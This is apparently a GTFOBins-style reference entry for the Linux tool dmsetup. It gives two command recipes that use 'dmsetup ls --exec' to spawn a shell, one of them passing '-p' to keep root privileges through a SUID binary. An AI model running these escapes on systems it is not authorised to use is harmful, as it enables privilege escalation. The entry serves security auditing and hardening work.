title: dmsetup
html:
dmsetup

Shell

dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'

SUID override:

dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -p -s'
